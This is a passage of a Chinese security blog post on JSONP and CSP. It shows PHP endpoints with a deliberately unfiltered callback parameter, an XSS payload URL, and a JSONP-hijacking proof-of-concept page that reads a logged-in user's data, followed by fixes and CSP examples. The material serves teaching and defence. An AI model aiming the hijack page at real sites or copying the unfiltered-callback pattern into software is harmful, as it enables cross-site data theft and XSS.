+<p><a target="_blank" rel="noopener" href="https://hupc.site/?p=988">PHP项目处理Chrome浏览器SameSite跨域问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2901">https://forum.butian.net/share/2901</a></p>
+<h1 id="JSONP劫持漏洞"><a href="#JSONP劫持漏洞" class="headerlink" title="JSONP劫持漏洞"></a>JSONP劫持漏洞</h1><h2 id="JSONP原理"><a href="#JSONP原理" class="headerlink" title="JSONP原理"></a>JSONP原理</h2><p>ajax请求受同源策略影响，不允许进行跨域请求，而script标签src属性中的链接却可以访问跨域的js脚本，利用这个特性，服务端不再返回JSON格式的数据，而是返回一段调用某个函数的js代码，在src中进行了调用，这样实现了跨域。</p>
+<p>简单来说，JSONP 是一种“借助 <code>&lt;script&gt;</code> 标签加载远程 JavaScript 并执行”的技术。通过在本地定义回调函数并将其名称传递给服务器，服务器返回执行该回调的 JavaScript 代码，从而实现数据传递。</p>
+<p>定义函数</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
+	<span class="token keyword">function</span> <span class="token function">jsonhandle</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"age:"</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token string">"name:"</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"jquery-1.8.3.min.js"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"http://www.server.com/student.php?callback=jsonhandle"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+
+<p>远程返回数据直接调用函数</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+	<span class="token string single-quoted-string">'age'</span> <span class="token operator">=></span> <span class="token number">20</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'张三'</span><span class="token punctuation">,</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$callback</span><span class="token operator">.</span><span class="token string double-quoted-string">"("</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span><span class="token punctuation">;</span></span></code></pre>
+
+<h2 id="JSONP漏洞"><a href="#JSONP漏洞" class="headerlink" title="JSONP漏洞"></a>JSONP漏洞</h2><p><strong>漏洞原理：</strong></p>
+<p>简单说就是callback可以自定义</p>
+<p>例如上面，jsonp.php文件</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+	<span class="token string single-quoted-string">'age'</span> <span class="token operator">=></span> <span class="token number">20</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'张三'</span><span class="token punctuation">,</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$callback</span><span class="token operator">.</span><span class="token string double-quoted-string">"("</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span><span class="token punctuation">;</span></span></code></pre>
+
+<p>这里$callback可控</p>
+<p><code>http://127.0.0.1/admin/jsonp.php?callback=&lt;script&gt;alert(11)&lt;/script&gt;</code></p>
+<p>造成XSS</p>
+<p><img src="/images/posts/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20241111211556567.png" alt="image-20241111211556567"></p>
+<p>返回的Content-Type如果是application&#x2F;json、text&#x2F;json、application&#x2F;javascript、text&#x2F;javascript等都不触发XSS</p>
+<h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><p>JsonpLogin.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!==</span> <span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$user</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/admin ; Secure'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"登录成功"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"状态：未登录"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="http://127.0.0.1/admin/info.php?callback=jsonp">用户信息&lt;/a>&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;html>
+   &lt;head>
+      &lt;title>登录&lt;/title>
+      &lt;meta charset="utf-8">
+   &lt;/head>
+   &lt;body>
+      &lt;form action="JsonpLogin.php" method="get">
+         用户名：&lt;input type="text" name="user">
+         密码：&lt;input type="password" name="pwd">
+         &lt;input type="submit" name="submit" value="login">
+      &lt;/form>
+   &lt;/body>
+   &lt;/html>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"欢迎您, "</span><span class="token operator">.</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br data-tomark-pass>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>info.php</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type: application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//session_start();</span>
+<span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$callback</span><span class="token operator">.</span><span class="token string double-quoted-string">"(&#123;'id':1,'name':'Sentiment'&#125;)"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"未获取到信息"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>JsonpLogin登录后info获取信息，构造恶意html</p>
+<p>jsonpExp.html</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>lol<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.6.0.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">function</span> <span class="token function">jsonp_hack</span><span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"JSONP hijacking"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> h <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+            a <span class="token operator">=</span> key <span class="token operator">+</span> <span class="token string">' : '</span> <span class="token operator">+</span> v<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' ,'</span><span class="token punctuation">;</span>
+            h <span class="token operator">+=</span> a<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">alert</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/admin/info.php?callback=jsonp_hack<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p>同样，这里的SameStie也要设置为None才行，不然不会携带Cookie</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul>
+<li>检查referer来源。</li>
+</ul>
+<ul>
+<li>设置token进行验证</li>
+</ul>
+<ul>
+<li>严格过滤callback函数名及JSON里数据的输出。</li>
+</ul>
+<ul>
+<li>使用CORS替换JSONP跨域功能。</li>
+<li>严格过滤callback函数名及JSON里数据的输出防止产生XSS漏洞。</li>
+<li>严格按照JSON格式标准输出Content-Type及编码（ Content-Type : application&#x2F;json; charset&#x3D;utf-8 ）。</li>
+<li>在callback输出之前加入其他字符(如：&#x2F;**&#x2F;、回车换行)这样不影响 JSON 文件加载，又能一定程度防御JSONP劫持攻击。</li>
+</ul>
+<p><strong>参考</strong></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6969526457009700877">https://juejin.cn/post/6969526457009700877</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2364388">https://cloud.tencent.com/developer/article/2364388</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12744">https://xz.aliyun.com/t/12744</a></p>
+<h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h2 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h2><p>内容安全策略（Content Security Policy，简称CSP）是一种以可信白名单作机制，来限制网站是否可以包含某些来源内容，缓解广泛的内容注入漏洞，比如 XSS。 简单来说，就是我们能够规定，我们的网站只接受我们指定的请求资源。默认配置下不允许执行内联代码（<code>&lt;script&gt;</code>块内容，内联事件，内联样式），以及禁止执行eval() , newFunction() , setTimeout([string], …) 和setInterval([string], …) 。</p>
+<p>CSP可以由两种方式指定： HTTP Header 和 HTML。</p>
+<ul>
+<li><p>通过定义在HTTP header 中使用：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">"Content-Security-Policy:" 策略集</code></pre>
+</li>
+<li><p>通过定义在 HTML meta标签中使用：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-security-policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>策略集<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre></li>
+</ul>
+<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><table>
+<thead>
+<tr>
+<th>指令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>default-src</td>
+<td>定义资源默认加载策略</td>
+</tr>
+<tr>
+<td>connect-src</td>
+<td>定义 Ajax、WebSocket 等加载策略</td>
+</tr>
+<tr>
+<td>font-src</td>
+<td>定义 Font 加载策略</td>
+</tr>
+<tr>
+<td>frame-src</td>
+<td>定义 Frame 加载策略</td>
+</tr>
+<tr>
+<td>img-src</td>
+<td>定义图片加载策略</td>
+</tr>
+<tr>
+<td>media-src</td>
+<td>定义 <audio>、<video> 等引用资源加载策略</td>
+</tr>
+<tr>
+<td>object-src</td>
+<td>定义 <applet>、<embed>、<object> 等引用资源加载策略</td>
+</tr>
+<tr>
+<td>script-src</td>
+<td>定义 JS 加载策略</td>
+</tr>
+<tr>
+<td>style-src</td>
+<td>定义 CSS 加载策略</td>
+</tr>
+<tr>
+<td>base-uri</td>
+<td>定义 <base> 根URL策略，不使用default-src作为默认值</td>
+</tr>
+<tr>
+<td>sandbox</td>
+<td>值为 allow-forms，对资源启用 sandbox</td>
+</tr>
+<tr>
+<td>report-uri</td>
+<td>值为 &#x2F;report-uri，提交日志</td>
+</tr>
+</tbody></table>
+<hr>
+<table>
+<thead>
+<tr>
+<th>指令值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>允许加载任何内容</td>
+</tr>
+<tr>
+<td>‘none’</td>
+<td>不允许加载任何内容</td>
+</tr>
+<tr>
+<td>‘self’</td>
+<td>允许加载相同源的内容</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://www.a.com/">www.a.com</a></td>
+<td>允许加载指定域名的资源</td>
+</tr>
+<tr>
+<td>*.a.com</td>
+<td>允许加载 a.com 任何子域名的资源</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://a.com/">https://a.com</a></td>
+<td>允许加载 a.com 的 https 资源</td>
+</tr>
+<tr>
+<td>https：</td>
+<td>允许加载 https 资源</td>
+</tr>
+<tr>
+<td>data：</td>
+<td>允许加载 data: 协议，例如：base64编码的图片</td>
+</tr>
+<tr>
+<td>‘unsafe-inline’</td>
+<td>允许加载 inline 资源，例如style属性、onclick、inline js、inline css等</td>
+</tr>
+<tr>
+<td>‘unsafe-eval’</td>
+<td>允许加载动态 js 代码，例如 eval()</td>
+</tr>
+</tbody></table>
+<p>例如</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'self'; script-src 'self' ; object-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://47.116.120.205/remote.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p>则不能加载remote.js进行弹窗, 添加网址后可正常加载</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'self'; script-src 'self' http://47.116.120.205; object-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://47.116.120.205/remote.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p><strong>参考</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mutudou/p/14373644.html">https://www.cnblogs.com/mutudou/p/14373644.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/xss/csp.html">https://websec.readthedocs.io/zh/latest/vuln/xss/csp.html</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Doramer</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://doramer.github.io/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/">https://doramer.github.io/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Doramer</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">前端漏洞</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Linux提权(escalate_linux_1靶机)">
+                        
+                        <span class="card-title">Linux提权(escalate_linux_1靶机)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%8F%90%E6%9D%83/">
+                        <span class="chip bg-color">提权</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="前端跨域漏洞">
+                        
+                        <span class="card-title">前端跨域漏洞</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
